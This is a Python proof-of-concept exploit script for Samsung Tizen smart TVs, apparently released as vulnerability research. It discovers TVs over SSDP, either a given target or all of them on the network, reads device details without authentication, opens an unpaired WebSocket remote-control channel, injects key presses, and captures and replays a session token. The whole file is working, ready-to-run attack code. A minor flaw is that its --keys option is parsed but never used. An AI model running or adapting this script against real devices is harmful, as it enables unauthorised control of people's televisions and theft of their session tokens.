#!/usr/bin/env python3
"""
Samsung Tizen Smart Hub — End-to-End PoC
==========================================
Demonstrates the full attack chain:
  Phase 1 — SSDP Discovery (find Samsung TV on network)
  Phase 2 — Smart Hub API Enumeration (unauthenticated device info)
  Phase 3 — WebSocket Connection (unauthenticated remote control)
  Phase 4 — Key Injection (send commands to TV without pairing)
  Phase 5 — Token Capture (record replayable session token)
  Phase 6 — Evidence Generation (JSON report + log)

Research IDs: TIZEN-2026-001, TIZEN-2026-005
CVSSv3.1: 9.8 CRITICAL (TIZEN-2026-001)

Author: Andre Henrique (@mrhenrike) | Uniao Geek — https://github.com/Uniao-Geek
"""
import argparse
import base64
import json
import os
import socket
import struct
import sys
import tempfile
import time
import urllib.request
import urllib.error
import re

# --- Ensure temp dir is inside project ---
_project_tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", ".tmp")
os.makedirs(_project_tmp, exist_ok=True)
tempfile.tempdir = _project_tmp

SSDP_ADDR = "239.255.255.250"
SSDP_PORT = 1900
API_PORT  = 8001
TIMEOUT   = 5.0

DEMO_KEYS = ["KEY_MUTE", "KEY_VOLDOWN", "KEY_VOLUP", "KEY_MUTE"]

SSDP_MSEARCH = (
    "M-SEARCH * HTTP/1.1\r\n"
    f"HOST: {SSDP_ADDR}:{SSDP_PORT}\r\n"
    'MAN: "ssdp:discover"\r\n'
    "ST: urn:samsung.com:device:RemoteControlReceiver:1\r\n"
    "MX: 3\r\n\r\n"
).encode()


class TizenPoC:
    def __init__(self, target: str, verbose: bool = True):
        self.target  = target
        self.verbose = verbose
        self.token   = ""
        self.evidence = {
            "target":       target,
            "timestamp":    time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "phases":       {},
            "findings":     [],
            "vuln_ids":     [],
        }

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg)

    # ------------------------------------------------------------------
    # Phase 1: SSDP Discovery
    # ------------------------------------------------------------------
    def phase1_ssdp(self) -> bool:
        self.log("\n[Phase 1] SSDP Discovery")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.settimeout(3.0)
        sock.sendto(SSDP_MSEARCH, (SSDP_ADDR, SSDP_PORT))
        responses = []
        try:
            while True:
                data, addr = sock.recvfrom(65536)
                if addr[0] == self.target:
                    responses.append(data.decode(errors="replace"))
        except socket.timeout:
            pass
        sock.close()
        if responses:
            loc = re.search(r"LOCATION:\s*(.+)", responses[0], re.IGNORECASE)
            self.evidence["phases"]["ssdp"] = {
                "status":   "found",
                "location": loc.group(1).strip() if loc else "",
                "responses": len(responses),
            }
            self.log(f"  [+] TV responds to SSDP — {len(responses)} response(s)")
            self.evidence["vuln_ids"].append("TIZEN-2026-004 (SSDP amplification capable)")
            return True
        self.evidence["phases"]["ssdp"] = {"status": "no_response"}
        self.log(f"  [-] No SSDP response from {self.target}")
        return False

    # ------------------------------------------------------------------
    # Phase 2: Smart Hub API Enumeration
    # ------------------------------------------------------------------
    def phase2_enumerate(self) -> bool:
        self.log("\n[Phase 2] Smart Hub API Enumeration (Unauthenticated)")
        url = f"http://{self.target}:{API_PORT}/api/v2/"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                data = json.loads(resp.read().decode())
        except Exception as e:
            self.evidence["phases"]["enumerate"] = {"status": "failed", "error": str(e)}
            self.log(f"  [-] API not accessible: {e}")
            return False

        device = data.get("device", {})
        self.evidence["phases"]["enumerate"] = {
            "status":   "success",
            "endpoint": url,
            "device":   device,
        }
        self.evidence["findings"].append({
            "id":       "TIZEN-2026-001",
            "severity": "CRITICAL",
            "title":    "Unauthenticated Device Information Disclosure",
            "evidence": f"GET {url} returned device info without any credentials",
            "data": {
                "model":    device.get("modelName", "?"),
                "firmware": device.get("firmwareVersion", "?"),
                "mac":      device.get("wifiMac", "?"),
                "ip":       device.get("ip", "?"),
                "name":     device.get("name", "?"),
            },
        })
        if "TIZEN-2026-001" not in self.evidence["vuln_ids"]:
            self.evidence["vuln_ids"].append("TIZEN-2026-001")
        self.log(f"  [+] Model:    {device.get('modelName','?')}")
        self.log(f"  [+] Firmware: {device.get('firmwareVersion','?')}")
        self.log(f"  [+] MAC:      {device.get('wifiMac','?')}")
        return True

    # ------------------------------------------------------------------
    # Phase 3: WebSocket Connection
    # ------------------------------------------------------------------
    def _ws_connect(self, token: str = "") -> socket.socket | None:
        path = f"/api/v2/channels/samsung.remote.control"
        if token:
            path += f"?token={token}"
        key  = base64.b64encode(os.urandom(16)).decode()
        hs   = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.target}:{API_PORT}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Version: 13\r\n\r\n"
        ).encode()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((self.target, API_PORT))
            sock.sendall(hs)
            resp = b""
            while b"\r\n\r\n" not in resp:
                chunk = sock.recv(4096)
                if not chunk:
                    return None
                resp += chunk
            if b"101" in resp:
                return sock
        except Exception as e:
            self.log(f"  [WS] Connect error: {e}")
        return None

    def _ws_send(self, sock: socket.socket, data: str) -> None:
        payload  = data.encode()
        mask_key = os.urandom(4)
        masked   = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
        plen     = len(payload)
        header   = bytes([0x81, 0x80 | plen]) + mask_key if plen <= 125 else (
                   bytes([0x81, 0xFE]) + struct.pack(">H", plen) + mask_key)
        sock.sendall(header + masked)

    def _ws_recv(self, sock: socket.socket) -> str:
        try:
            header = sock.recv(2)
            if len(header) < 2:
                return ""
            plen = header[1] & 0x7F
            if plen == 126:
                plen = struct.unpack(">H", sock.recv(2))[0]
            elif plen == 127:
                plen = struct.unpack(">Q", sock.recv(8))[0]
            return sock.recv(plen).decode(errors="replace")
        except Exception:
            return ""

    def phase3_websocket(self) -> bool:
        self.log("\n[Phase 3] WebSocket Connection (Unauthenticated)")
        app_name = base64.b64encode(b"TizenSecurityPoC").decode()
        sock = self._ws_connect()
        if not sock:
            self.evidence["phases"]["websocket"] = {"status": "failed"}
            self.log(f"  [-] WebSocket connection failed")
            return False

        connect_cmd = json.dumps({
            "method": "ms.channel.connect",
            "params": {"name": app_name, "token": ""},
        })
        self._ws_send(sock, connect_cmd)
        time.sleep(0.5)
        resp = self._ws_recv(sock)

        try:
            rd = json.loads(resp)
            self.token = rd.get("data", {}).get("token", "")
        except Exception:
            pass

        self.evidence["phases"]["websocket"] = {
            "status":   "connected",
            "response": resp[:500],
            "token":    self.token,
        }
        self.log(f"  [+] WebSocket connected without pairing!")
        if self.token:
            self.log(f"  [+] Token captured: {self.token}")
            self.evidence["findings"].append({
                "id":       "TIZEN-2026-005",
                "severity": "HIGH",
                "title":    "Smart Hub Token Captured (Replayable)",
                "evidence": f"Token '{self.token}' captured in plaintext WebSocket — replayable indefinitely",
            })
            self.evidence["vuln_ids"].append("TIZEN-2026-005")
        sock.close()
        return True

    # ------------------------------------------------------------------
    # Phase 4: Key Injection
    # ------------------------------------------------------------------
    def phase4_key_inject(self, keys: list[str]) -> bool:
        self.log("\n[Phase 4] Remote Key Injection (Unauthenticated)")
        sock = self._ws_connect(self.token)
        if not sock:
            self.evidence["phases"]["key_inject"] = {"status": "failed"}
            self.log(f"  [-] Cannot connect for key injection")
            return False

        injected = []
        app_name = base64.b64encode(b"TizenSecurityPoC").decode()
        connect_cmd = json.dumps({
            "method": "ms.channel.connect",
            "params": {"name": app_name, "token": self.token},
        })
        self._ws_send(sock, connect_cmd)
        time.sleep(0.3)
        self._ws_recv(sock)

        for key in keys:
            cmd = json.dumps({
                "method":  "ms.remote.control",
                "params":  {
                    "Cmd":           "Click",
                    "DataOfCmd":     key,
                    "Option":        "false",
                    "TypeOfRemote":  "SendRemoteKey",
                }
            })
            self._ws_send(sock, cmd)
            time.sleep(0.2)
            resp = self._ws_recv(sock)
            success = "error" not in resp.lower()
            injected.append({"key": key, "success": success, "response": resp[:200]})
            self.log(f"  [{'+'if success else '-'}] Key {key}: {'injected' if success else 'rejected'}")

        sock.close()
        self.evidence["phases"]["key_inject"] = {
            "status":   "attempted",
            "keys":     injected,
            "success":  any(k["success"] for k in injected),
        }
        if any(k["success"] for k in injected):
            self.evidence["findings"].append({
                "id":       "TIZEN-2026-001",
                "severity": "CRITICAL",
                "title":    "Remote Key Injection — Full TV Control Without Authentication",
                "evidence": f"Sent {len([k for k in injected if k['success']])} keys without pairing",
                "keys_injected": [k["key"] for k in injected if k["success"]],
            })
        return True

    # ------------------------------------------------------------------
    # Phase 5: Token Replay
    # ------------------------------------------------------------------
    def phase5_token_replay(self) -> bool:
        if not self.token:
            self.log("\n[Phase 5] Token Replay — No token captured, skipping")
            return False
        self.log(f"\n[Phase 5] Token Replay with captured token: {self.token}")
        sock = self._ws_connect(self.token)
        if not sock:
            self.evidence["phases"]["token_replay"] = {"status": "failed"}
            return False

        app_name = base64.b64encode(b"TizenSecurityPoC-Replay").decode()
        connect_cmd = json.dumps({
            "method": "ms.channel.connect",
            "params": {"name": app_name, "token": self.token},
        })
        self._ws_send(sock, connect_cmd)
        time.sleep(0.3)
        resp = self._ws_recv(sock)
        accepted = "unauthorized" not in resp.lower() and "error" not in resp.lower()
        sock.close()

        self.evidence["phases"]["token_replay"] = {
            "status":   "accepted" if accepted else "rejected",
            "token":    self.token,
            "response": resp[:300],
        }
        self.log(f"  [{'+'if accepted else '-'}] Token replay {'ACCEPTED — persistent session!' if accepted else 'rejected'}")
        return accepted

    # ------------------------------------------------------------------
    # Phase 6: Evidence
    # ------------------------------------------------------------------
    def phase6_evidence(self) -> str:
        self.log("\n[Phase 6] Saving Evidence")
        self.evidence["summary"] = {
            "vuln_count":    len(set(v.split()[0] for v in self.evidence["vuln_ids"])),
            "vuln_ids":      list(set(self.evidence["vuln_ids"])),
            "findings_count": len(self.evidence["findings"]),
            "critical":      sum(1 for f in self.evidence["findings"] if f.get("severity") == "CRITICAL"),
            "high":          sum(1 for f in self.evidence["findings"] if f.get("severity") == "HIGH"),
        }
        out_path = os.path.join(_project_tmp, f"tizen_e2e_poc_{self.target.replace('.','_')}.json")
        with open(out_path, "w") as f:
            json.dump(self.evidence, f, indent=2)
        self.log(f"\n  Evidence saved: {out_path}")
        return out_path

    def run(self) -> dict:
        print(f"\n{'='*60}")
        print(f"Samsung Tizen Smart Hub — End-to-End PoC")
        print(f"Target: {self.target}")
        print(f"Research: TIZEN-2026-001 (9.8 CRITICAL) + TIZEN-2026-005 (8.8 HIGH)")
        print(f"{'='*60}")

        self.phase1_ssdp()
        ok2 = self.phase2_enumerate()
        ok3 = self.phase3_websocket()
        if ok3:
            self.phase4_key_inject(DEMO_KEYS)
            self.phase5_token_replay()
        evidence_path = self.phase6_evidence()

        print(f"\n{'='*60}")
        print(f"Results:")
        print(f"  Vulnerabilities: {len(set(self.evidence['vuln_ids']))}")
        for vid in set(self.evidence["vuln_ids"]):
            print(f"    {vid}")
        print(f"  Evidence: {evidence_path}")
        return self.evidence


def ssdp_find_samsung(timeout: float = 5.0) -> list[str]:
    """Auto-discover Samsung TVs on local network."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.settimeout(timeout)
    sock.sendto(SSDP_MSEARCH, (SSDP_ADDR, SSDP_PORT))
    found = set()
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data, addr = sock.recvfrom(65536)
            resp = data.decode(errors="replace")
            if "samsung" in resp.lower() or "tizen" in resp.lower():
                found.add(addr[0])
        except socket.timeout:
            break
        except Exception:
            continue
    sock.close()
    return list(found)


def main():
    parser = argparse.ArgumentParser(
        description="Samsung Tizen Smart Hub End-to-End PoC (TIZEN-2026-001/005)"
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--target",    help="TV IP address")
    group.add_argument("--auto",      action="store_true", help="Auto-discover Samsung TVs via SSDP")
    parser.add_argument("--verbose",  "-v", action="store_true", default=True)
    parser.add_argument("--keys",     nargs="+", default=DEMO_KEYS, help="Keys to inject")
    args = parser.parse_args()

    targets = []
    if args.auto:
        print("[*] Auto-discovering Samsung TVs via SSDP...")
        targets = ssdp_find_samsung()
        if not targets:
            print("[-] No Samsung TVs found")
            sys.exit(1)
        print(f"[+] Found {len(targets)} TV(s): {targets}")
    else:
        targets = [args.target]

    for t in targets:
        poc = TizenPoC(t, verbose=args.verbose)
        poc.run()


if __name__ == "__main__":
    main()
